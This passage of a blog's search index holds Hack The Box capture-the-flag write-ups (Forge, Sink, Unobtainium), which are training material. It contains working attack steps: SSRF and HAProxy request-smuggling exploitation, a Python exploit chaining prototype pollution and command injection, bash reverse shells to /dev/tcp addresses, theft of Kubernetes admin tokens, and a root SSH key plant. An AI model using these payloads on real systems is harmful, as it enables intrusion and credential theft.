/upload?u=ftp://user:heightofsecurity123!@127.1:21.And get ftp share.❯ python ssrf.py &#39;admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.1:21&#39;drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap-rw-r----- 1 0 1000 33 Sep 23 04:17 user.txtThis is an user’s home directory. Try to get ssh keyGet “User” shell on the box with ssh key.PrivescPython pdb ModuleUser have some sudo rightsuser@forge:~$ sudo -lMatching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.pyThis script have 2 interesting thingsOne is a password secretadminpassword for connecting to the socket. Another is a exception pdb.post_mortem(e.__traceback__)pdb: The module pdb defines an interactive source code debugger for Python programs.And this exception occurs if socket quit unintended way.Run script with sudo and connect to the socket from another terminal, Enter password then Ctrl+c, This will drop script to pdb shell where we can run system command with python os module as root." }, { "title": "Hackthebox - Sink", "url": "/posts/sink/", "categories": "hackthebox, linux", "tags": "haproxy 1.9.10, http request smuggling, localstack, aws, awscli, aws secretsmanager, aws kms decrypt", "date": "2021-09-07 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.225 sink.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)3000/tcp open ppp?| fingerprint-strings: | GenericLines, Help: | HTTP/1.0 200 OK| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gitea=b06d007546b891b1; Path=/; HttpOnly| Set-Cookie: _csrf=g8iWus6Yg0Gy4q5O_dzZHqGWHTM6MTYyODczODc4MTA2ODg3ODgzMQ; Path=/; Expires=Fri, 13 Aug 2021 03:26:21 GMT; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Thu, 12 Aug 2021 03:26:21 GMT| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&amp;gt;| &amp;lt;head data-suburl=&quot;&quot;&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;| &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;| &amp;lt;title&amp;gt; Gitea: Git with a cup of tea &amp;lt;/title&amp;gt;| &amp;lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&amp;gt;| &amp;lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&amp;gt;| &amp;lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot; /&amp;gt;| &amp;lt;meta name=&quot;description&quot; content=&quot;Gitea (Git with a cup of tea) is a painless5000/tcp open http Gunicorn 20.0.0|_http-server-header: gunicorn/20.0.0|_http-title: Sink Devops Port 3000 is running “gitea”, Identified from fingerprint-strings. Port 5000 is running “gunicorn/20.0.0” server. Gitea running Version: 1.12.6 There is no signup option in gitea. Only interesting thing found is, user “root” contributions but can not see them Final thing before diving is that “gunicorn” is a python http server and it cannot handle brute forcing or fuzzing.Port 5000 gunicorn is server running a static webapp and have login and signup optionFound haproxy is running from response header when doing sign. Also get a session cookie which is a flash auth token.we can verify cookie with flask-unsign❯ flask-unsign --decode --cookie &#39;eyJlbWFpbCI6Int7Nyo3fX1AdGVzdC5jb20ifQ.YSyjmQ.1l4PRcj8FZl60I98PFQkHpyaF-E&#39;{&#39;email&#39;: &#39;{\\{7*7\\}}@test.com&#39;}From google search for “haproxy” for something that already known and foundGuessing haproxy versionThere is HTTP Request Smuggling Vulnerability in haproxy package, versions &amp;lt;1.8.19-1+deb10u3; Source snyk Vulnerability DBVulnerability resolve in Debian:10 haproxy to version 1.8.19-1+deb10u3 or higher.The way i verify that this Vulnerability present in this box is,From Port 22 version header “OpenSSH 8.2p1 Ubuntu 4ubuntu0.1”, Running host version is possibly “Focal” and update date 2020-06-08; Source launchpadAnd Vulnerability resolve on 2020-09-26 update. Source launchpadOr, Just send a bad request to server and it will return the version numberServer is running version 1.9.10 and http smuggling Vulnerability found in HAProxy before 2.0.6.Footholdhttp Request Smuggling“When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to “smuggle” a request to one device without the other device being aware of it.”Important terms transfer-encoding: The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user; Source developer.mozilla.org “chunked” value specifications. With chunked value Enable, Data is sent in a series of chunks. The Content-Length header is omitted. At the beginning of each chunk(data) you need to add the length of the current chunk in hexadecimal format, followed by ‘\\r\\n’ and then the chunk itself, followed by another ‘\\r\\n’. The terminating chunk is a regular chunk, with the exception that its length is zero and formatted same as regular data chunks. RFC2616Resources for learning/understanding Video: Hiding Wookiees in HTTP: HTTP smuggling by @regilero Video: Practical Attacks Using HTTP Request Smuggling by @defparam Video: HTTP Desync Attacks: Smashing into the Cell Next Door by @albinowax owasp: https://www.youtube.com/watch?v=upEMlJeU_Ik defcon: https://www.youtube.com/watch?v=w-eJM2Pc0KI blackhat: https://www.youtube.com/watch?v=kgkRih2MQtU blackhat: https://www.youtube.com/watch?v=_A04msdplXs Research: request-smuggling from portswigger Blog: Protocol Layer Attack - HTTP Request SmugglingTools smuggler by defparamExploit CL.TECL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.hacktricks source that found from google search.CVE identifier: CVE-2019-18277Vulnerability Description: “A flaw was found in HAProxy before 2.0.6. In legacy mode, messages featuring a transfer-encoding header missing the “chunked” value were not being correctly rejected. The impact was limited but if combined with the “http-reuse always” setting, it could be used to help construct an HTTP request smuggling attack against a vulnerable component employing a lenient parser that would ignore the content-length header as soon as it saw a transfer-encoding one (even if not entirely valid according to the specification).”And here is the haproxy Vulnerability PoC by ndavisonWhen Transfer-Encoding and Content-Length is provided together, The request HAProxy sends to the backend has correctly prioritized Transfer-Encoding, and has stripped out the content-length and cut off everything, which went outside the boundary of the Transfer-Encoding request (Anything after 0).However, if we have a \\x0b (vertical tab) before the “chunked” string (note: \\x0c aka form feed also works).In this case, the Transfer-Encoding is not detected by HAProxy, and so the Content-Length is used. However, because the Transfer-Encoding remains in the request sent to the backend, it means that if a backend server manages to parse the Transfer-Encoding header and proceeds to treat the request as a TE encoded request, a desync could occur and the backend TCP socket could be poisoned. This could then lead to HTTP request smuggling.So if the backend server allowed Transfer-Encoding then backend server give priority to Transfer-Encoding header and terminate request at terminating chunk 0 and anything after that treated as second request. If not worked then use connection as keep-aliveAnd you can add 0b byte before chunked string from hex tab in repeater window and with \\n switch in repeater window you can see non-printable charsIf everything goes well, our comment contains admin session cookieGot admin cookie because while backend server waiting to complete 300 bytes of data of our request while frontend server forward another user’s request to backend and this request concatenate to our request to complete 300 bytes.And replacing session cookie with admin cookie ge to the admin panelFrom admin’s /notes found 3 notes with creds and subdomainsChef Login : http://chef.sink.htb Username : chefadm Password : /6&#39;fEGC&amp;amp;zEx{4]zz Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L&amp;gt;Z3})zzfQ3 Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8&amp;lt;H6GK\\{*L.fB3C First i tried to login to gitea server because there is a user named “root” who has some contributionsWith root:FaH@3L&amp;gt;Z3})zzfQ3 creds logged in successfully and found some repositoriesSome interesting Information collected from these repositories: Got ssh key for user “marcus” from http://10.10.10.225:3000/root/Key_Management/commit/b01a6b7ed372d154ed0bc43a342a5e1203d07b1e commit in root’s “Key_Management” repository. Found some aws secret from http://10.10.10.225:3000/root/Log_Management/commit/e8d68917f2570f3695030d0ded25dc95738fb1ba commit in root’s “Log_Management” repository. Privesc Get shell as user marcus and there is a another use name “david”.There are multiple containerd container (total 16) running same web server application.This application is same, where we exploit http request smuggling in foothold. Every container of this application is running some services that doing there parts(guessing) Running /usr/local/bin/gunicorn server. Running /home/haproxy/haproxy server. Executing /home/bot/bot.py which give us admin token from http smuggling attack. Running /usr/bin/fail2ban-server to prevent brute-force on web server. There are some local services runningPort 4566 is by defaut used by localstacklocalstack running from a container on 172.18.0.2. localstack provides an easy-to-use test/mocking framework for developing Cloud applications. It spins up a testing environment on your local machine that provides the same functionality and APIs as the real AWS cloud environment. awscli already installed in the box.There is a local aws instance is running and awscli already installed in the box and we found aws secret from gitea.AWS secretsmanagerConfigure awscli to access localstack instance by running aws configureGet access to aws secretsmanager, aws secrets manager stores credentials.aws --endpoint-url=&quot;http://127.0.0.1:4566/&quot; secretsmanager list-secretsThere are 3 secret IDs(ARN), we can retrieve there secret string with; Source aws docsaws --endpoint-url=&quot;http://127.0.0.1:4566/&quot; secretsmanager get-secret-value --secret-id &amp;lt;ARN&amp;gt;and get david password from &quot;arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-LtCKQ&quot;There is a encrypted file in david home folderAWS kms decryptFrom aws kms docs found some kms command that are useful.decrypt: Decrypts ciphertext that was encrypted by a KMS key.enable-key: Sets the key state of a KMS key to enabled. This allows you to use the KMS key for cryptographic operations.list-keys : Gets a list of all KMS keys in the caller’s Amazon Web Services account and Region.describe-key: Provides detailed information about a KMS key.Get kms key from aws serveraws --endpoint-url=&quot;http://127.0.0.1:4566/&quot; kms list-keysNow to can decrypt that file with decrypt commandaws --endpoint-url=&quot;http://127.0.0.1:4566/&quot; kms decrypt \\ --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc \\ --key-id &amp;lt;KeyId&amp;gt; \\ --output text \\ --query Plaintext | base64but when run this command, get key is disabled error.First we need to enable all key withaws --endpoint-url=&quot;http://127.0.0.1:4566/&quot; kms enable-key --key-id &amp;lt;KeyId&amp;gt;Second, This file is not encrypted with default encryption algorithm. We can check this by describing ‘KeyArn”aws --endpoint-url=&quot;http://127.0.0.1:4566/&quot; kms describe-key --key-id &quot;&amp;lt;KeyArn&amp;gt;&quot;Final decryption scriptkeys=$(aws --endpoint-url=&quot;http://127.0.0.1:4566/&quot; kms list-keys | grep KeyId | cut -d&#39;&quot;&#39; -f4)for key in $keys;do aws --endpoint-url=&quot;http://127.0.0.1:4566/&quot; kms enable-key --key-id &quot;$key&quot; aws --endpoint-url=&quot;http://127.0.0.1:4566/&quot; kms decrypt \\ --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc \\ --encryption-algorithm &quot;RSAES_OAEP_SHA_256&quot; \\ --key-id &quot;$key&quot; \\ --output text \\ --query Plaintext | base64doneAnd file decrypted with 804125db-bdf1-465a-a058-07fc87c0fad0aws --endpoint-url=&quot;http://127.0.0.1:4566/&quot; kms decrypt \\ --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc \\ --encryption-algorithm &quot;RSAES_OAEP_SHA_256&quot; \\ --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 \\ --output text \\ --query Plaintext | base64 \\ --decode &amp;gt; decrypted-fileGot an admin password which worked for root user." }, { "title": "Hackthebox - Unobtainium", "url": "/posts/unobtainium/", "categories": "hackthebox, linux", "tags": "reversing, electron application, deb package, lodash 4.17.4, prototype pollution, google-cloudstorage-commands 0.0.1, command injection, kubernetes", "date": "2021-09-05 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.235 unobtainium.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)| 256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)|_ 256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Unobtainium2379/tcp open ssl/etcd-client?| ssl-cert: Subject: commonName=unobtainium| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1| Not valid before: 2021-01-17T07:10:30|_Not valid after: 2022-01-17T07:10:30|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ h2| tls-nextprotoneg: |_ h22380/tcp open ssl/etcd-server?| ssl-cert: Subject: commonName=unobtainium| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1| Not valid before: 2021-01-17T07:10:30|_Not valid after: 2022-01-17T07:10:30|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ h2| tls-nextprotoneg: |_ h28443/tcp open ssl/https-alt| fingerprint-strings: # ...[snip] ...|_http-title: Site doesn&#39;t have a title (application/json).| ssl-cert: Subject: commonName=minikube/organizationName=system:masters| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1| Not valid before: 2021-05-30T07:10:33|_Not valid after: 2022-05-31T07:10:33|_ssl-date: TLS randomness does not represent time| tls-alpn: | h2|_ http/1.110250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).| ssl-cert: Subject: commonName=unobtainium@1610865428| Subject Alternative Name: DNS:unobtainium| Not valid before: 2021-01-17T05:37:08|_Not valid after: 2022-01-17T05:37:08|_ssl-date: TLS randomness does not represent time| tls-alpn: | h2|_ http/1.110256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).31337/tcp open http Node.js Express framework| http-methods: |_ Potentially risky methods: PUT DELETE|_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel In first visit, Don’t find anything interesting anywhere. Only Apache httpd on port 80 contains a downloadable archive.FootholdReversing Electron application deb packageUnzip downloaded archive gets a deb package. we can use dpkg to view control information of the deb package. get from hereFound Some information Hostname: unobtainium.htb Username: felamos@unobtainium.htbExtract files from deb file with ar utility.ar -xv unobtainium_1.0.0_amd64.debcontrol.tar.gz archive contains scripts used by package installer to install binaries.❯ tar -xvf control.tar.gz././postinst./postrm./control./md5sumsFrom these tar archives get some information about that package. This application written in Electron framework Package created with FPMdata.tar.xz contains all executable binaries under ./opt/unobtainium folder.All Electron framework creates An asar archive is a simple tar-like format that concatenates files into a single file to mitigate issues around long path names, slightly speed up require and conceal your source code from cursory inspection.Electron can read arbitrary files from it without unpacking the whole file.We can find that file in ./opt/unobtainium/resources and Extract it with asar. get from hereonly interesting file found on application source code is todo,jsFound interesting information User creds: felamos:Winter2021 this script sending post request to /todo and requesting for a txt file.If we go to “TODO” in the app, we get the todo list.Intercepting application traffic on burp by setting http_proxy environment variable. get from hereexport http_proxy=127.0.0.1:8080Intercepting /todo request, and changing &quot;filename&quot;:&quot;todo.txt&quot; value. gets an error with empty value.after some try, get some idea that we are currently /usr/src/app/ here and we can not go anywhere from here, but we can read any file inside that directory.try to Read for ./index.js fileGet some interesting information from index.js file There are 2 user, in this application, admin user password is random, so not possible to get it. There is a another endpoint /upload But it is checking for user.canUpload and only admin can upload. So this never gonna possible. Don’t find anything in index.js that can be exploitable.Next Checking package.json for any outdated or vulnerable dependencies used by this application and found 2 dependencies and both are outdated and vulnerable.Prototype Pollution lodash: 4.17.4 is vulnerable for Prototype Pollution Vulnerability, CVE-2018-16487: snyk Vulnerability DB, in lodash &amp;lt;4.17.11 functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype. And we can verify this from index.js file that put method when sending message it uses _.merge Exploit PoC from Kirill89@github.com Exploit We can use Prototype Pollution Vulnerability to enable canUpload for user felamos {&quot;auth&quot;:{&quot;name&quot;:&quot;felamos&quot;,&quot;password&quot;:&quot;Winter2021&quot;},&quot;message&quot;:{&quot;text&quot;: &quot;test&quot;, &quot;__proto__&quot;: {&quot;canUpload&quot;: true}}} Command injection google-cloudstorage-commands : 0.0.1 CVE-2020-28436: snyk Vulnerability DB, Affected versions of this package are vulnerable to Command Injection from upload function. If we check source code of this library, it is using exec function to upload file. And we can verify this from index.js file that /upload is using upload() function. PoC Found on snyk Vulnerability DB Exploit now we can Use /upload endpoint with user “felamos” credentials to inject system command into upload() function from filename parameter. {&quot;auth&quot;:{&quot;name&quot;:&quot;felamos&quot;,&quot;password&quot;:&quot;Winter2021&quot;},&quot;filename&quot;:&quot;&amp;amp; &amp;lt;command&amp;gt;&quot;} Automate scriptimport argparseimport jsonimport requests as rimport sysparser = argparse.ArgumentParser()url = &#39;http://10.10.10.235:31337&#39;def read_file(file): data = {&quot;auth&quot;: {&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;}, &quot;filename&quot;: f&quot;{file}&quot;} jsonify = json.dumps(data) headers = {&#39;Content-type&#39;: &#39;application/json&#39;, &#39;Accept&#39;: &#39;application/json, text/javascript, */*; q=0.01&#39;} rspn = r.post(f&#39;{url}/todo&#39;, data=jsonify, headers=headers) cleaned = rspn.text.replace(&#39;\\\\n&#39;, &#39;\\n&#39;).replace(&#39;\\\\&#39;, &#39;&#39;) return cleaneddef send_proto(): data = {&quot;auth&quot;: {&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;}, &quot;message&quot;: {&quot;text&quot;: &quot;Prototype_Pollution&quot;, &quot;__proto__&quot;: {&quot;canUpload&quot;: True}}} jsonify = json.dumps(data) headers = {&#39;Content-type&#39;: &#39;application/json&#39;, &#39;Accept&#39;: &#39;application/json, text/javascript, */*; q=0.01&#39;} rspn = r.put(url, data=jsonify, headers=headers) return rspn.textdef exec_cmd(cmd): data = {&quot;auth&quot;: {&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;}, &quot;filename&quot;: f&quot;&amp;amp; {cmd}&quot;} jsonify = json.dumps(data) headers = {&#39;Content-type&#39;: &#39;application/json&#39;, &#39;Accept&#39;: &#39;application/json, text/javascript, */*; q=0.01&#39;} rspn = r.post(f&#39;{url}/upload&#39;, data=jsonify, headers=headers) return rspn.textparser.add_argument(&#39;-r&#39;, &#39;--read-file&#39;, help=&quot;&amp;lt;filename&amp;gt; Read file, Only application files&quot;)parser.add_argument(&#39;-U&#39;, action=&#39;store_true&#39;, help=&quot;Enable file Upload&quot;)parser.add_argument(&quot;-c&quot;, &#39;--command&#39;, help=&quot;Send blind System Command&quot;)args = parser.parse_args()if __name__ == &quot;__main__&quot;: try: if args.read_file: print(read_file(args.read_file)) elif args.U: print(send_proto()) elif args.command: print(exec_cmd(args.command)) else: print(f&quot;[-] Try python {sys.argv[0]} -h&quot;) except KeyboardInterrupt: print(&#39;User has exited the program&#39;)And finally get reverse shell❯ python exploit.py -c &#39;/bin/bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.71/4141 0&amp;gt;&amp;amp;1&quot;&#39;Privesc We are inside kubentes container [+] Container Platform ...... kubentes There is a crontab /var/spool/cron/crontabs/root running from root inside containerThis crontab is removing any file/binary with name “kubectl”. That means this container don’t want us to install kubectl command in this container.KubernetesKubernetes is an open-source container orchestration platform that enables the operation of an elastic web server framework for cloud applications. Source vmware.comCluster: A Kubernetes cluster is a set of nodes that run containerized applications. Multiple computer network or a supercomputer with tone of resources divided into small nodes.Node: Kubernetes runs your workload by placing containers into Pods to run on Nodes. A node may be a virtual or physical machine, depending on the cluster.Pods: Pod is similar to a group of Docker containers with shared namespaces and shared filesystem volumes.Containers: A container is a standard unit of software that packages up code and all its dependencies required for a application to run.Service AccountFrom hacktricks notesServiceAccount is an object managed by Kubernetes and used to provide an identity for processes that run in a pod.Every service account has a secret related to it and this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.Usually in the directory /run/secrets/kubernetes.io/serviceaccount or /var/run/secrets/kubernetes.io/serviceaccount you can find the files: ca.crt: It’s the ca certificate to check kubernetes communications namespace: It indicates the current namespace token: It contains the service token of the current pod.Kubectl https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1 https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/Connect to Kubernetes apiFound blog for create kubeconfig token came from /run/secrets/kubernetes.io/serviceaccount/token certificate-authority-data came form /run/secrets/kubernetes.io/serviceaccount/ca.crt in base64 encoded formatapiVersion: v1kind: Configusers:- name: poorduck user: token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC__eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvAclusters:- cluster: certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUM1ekNDQWMrZ0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeE1ERXdOekV6TWpRME9Wb1hEVE14TURFd05qRXpNalEwT1Zvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTVRDCmozSE9PMXRhaE1PUHpkNjhuYUtoQmVpYUFaM2lxdC9TY25lZ1RnbEttdHo1RGFnRUQ1WWFqWk0rVXl2UEVxUSsKdSttYjFaYzFLYnJjMkZnM0M0OEJZN09JUDZHZk9YOTkwUERLSmhxWnRhT0FkY1U1R2ExYXZTK2wzZG82VjJrQwplVnN0d1g2U1ZJYnpHSkVVeE1VUGlac0Z0Nkhzdk43aHRQMVA1Z2V3d3Rnc1ZJWER5TGwvZVJmd0NuMlpXK24zCk5nQzRPSTg0empWSHBYbVhGYUdzZURIYi9FNHdLL04waE1EMERFVlBKc0VPb2dITTlMbmRVZ3lKbWhBdFdiRWoKMjUrSDhBd1FpMy84UFlORXNtdFNBVUV1V3RZMzZweC9zRDVDdGhpTmxOcGtCNXQ1YzFHSzkwRG15b2ZxQmdZdgo5d2tDTkdHWktwM0F4TU1OMm5zQ0F3RUFBYU5DTUVBd0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQTBHQ1NxR1NJYjMKRFFFQkN3VUFBNElCQVFBSEpqbzhVYzNTSDFVbnNLU3daSlR1eWozNlcvbXNiTXIwcFNuM2RsRTZCb3V1a2hGMwo5R3htVmEyYW40L1ZGSmtBc1pTcUZVejFlNTJxdkpvRkpjWGVjNE1pTjZHWlRXdVVBOUQvanFpYXBuSFdlTzh4ClJHazRXTjY2WnJhTTBYM1BxYUhvK2NiZmhLT2xMOWprVXh2RSszQld1ajlwbHlEM245dEZlM2xuYXNEZnp5NE0KcTQ2NWl4UFpxRnFWY2h4UUZRK3BaMjRLaXFvUVc0bWFtL3g1RlB5MTMrTXc4SjR6Yjh2TGR1dkxRUjN3cFVHYgp2S1hkbktPTFdzaUV4eXJqcFpqWmJZQkw4YjcwNVhGRkd2bWFicDIxYUc4cHNCMVh2c0xpR0ZRRXF5RGZlRlJXCmhsN0twVUlTbDQrTnA1c0FpWE53dGJTREUrMjJRVnRaYnVEbgotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0t server: https://10.10.10.235:8443/ name: unobtainium-clustercontexts:- context: cluster: unobtainium-cluster user: poorduck name: contextcurrent-context: contextpreferences: colours: trueSave this config file in the ~/.kube/config and then we can access to Kubernetes api from our machine.EnumerationFollow-up with hacktricks notesCheck if we can read secret from current pod, but we don’tkubectl get secrets -o yaml -n kube-systemnamespace: Kubernetes supports multiple virtual clusters backed by the same physical cluster. These virtual clusters are called namespaces.kubectl get namespacesThere is a virtual clusters “dev”Checking permission of Current Privileges in kubeernetes api, we can list “dev” cluster pods.kubectl auth can-i --list -n devkubectl get pods -n devIf we check one of the pod information, we can see that all pods are running a node application on port 3000. These are the replicas of the application that is running on public port 31337, Where we found the prototype pollution and command injection.kubectl describe pod &amp;lt;pod_name&amp;gt; -n devWe can verify that this is the same app by sending same todo request.curl -s -X POST &#39;http://172.17.0.6:3000/todo&#39; --data &#39;{&quot;auth&quot;: {&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;}, &quot;filename&quot;: &quot;todo.txt&quot;}&#39; -H &#39;Content-type: application/json&#39;Root shell in DevSetup socat listener to redirect local reverse shell to our machine../socat tcp-l:8080 tcp:10.10.14.15:443 &amp;amp;Exploit Prototype Pollution to enable upload funcnalitycurl -s -X PUT &#39;http://172.17.0.10:3000&#39; --data &#39;{&quot;auth&quot;: {&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;},&quot;message&quot;: {&quot;text&quot;: &quot;Prototype_Pollution&quot;, &quot;__proto__&quot;: {&quot;canUpload&quot;: true}}}&#39; -H &#39;Content-type: application/json&#39;Exploit Command injection to get reverse shellcurl -s -X POST &#39;http://172.17.0.10:3000/upload&#39; --data &#39;{&quot;auth&quot;: {&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;}, &quot;filename&quot;: &quot;&amp;amp; /bin/bash -c \\&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.5/8080 0&amp;gt;&amp;amp;1\\&quot;&quot;}&#39; -H &#39;Content-type: application/json&#39;Replace kubeconfig token with current pod tokenand From this pod’s Current Privileges kubectl auth can-i --list, We can read kubernetes secrets and found admin tokenkubectl get secrets -o yaml -n kube-systemkubernetes with admin tokenNow if we check Current Privileges again from admin token, there is a extra rule and with that we can do all commands on all resourceswith that we can edit cluster deployment config file and mount host root in the pod.Edit webapp-deployment deployment config file.kubectl edit deployment webapp-deploymentin webapp-deployment there is already a host volume /opt/user/ is mounted in the deployment /roothere we can simply edit hostpath and replace with / and get host root filesystem in the container’s /rootafter edited check if deployment get restarted and new pods generated.kubectl get pods --all-namespacesHere new problem comes, After adding host root filesystem in webapp-deployment, this cluster died in every minute and regenerate new pods againthere seems to be a cron killing containers every minute.We can put ssh key in the host /root after mounted in the pod under one minute and then ssh in.Check new generated pod name with kubectl get pods --all-namespacesget inside that podkubectl exec -it webapp-deployment-7bd959c968-flvg2 -- bashAnd put ssh keymkdir /root/root/.sshchmod 700 /root/root/.sshecho &quot;&amp;lt;id_rsa.pub&amp;gt;&quot; &amp;gt; /root/root/.ssh/authorized_keyschmod 600 /root/root/.ssh/authorized_keys" }, { "title": "Hackthebox - Horizontall", "url": "/posts/horizontall/", "categories": "hackthebox, linux", "tags": "improper access control, command injection, laravel, laravel 8.4.2 debug mode, ignition 2.5.2", "date": "2021-08-28 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.105 horizontall.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)| 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)|_ 256 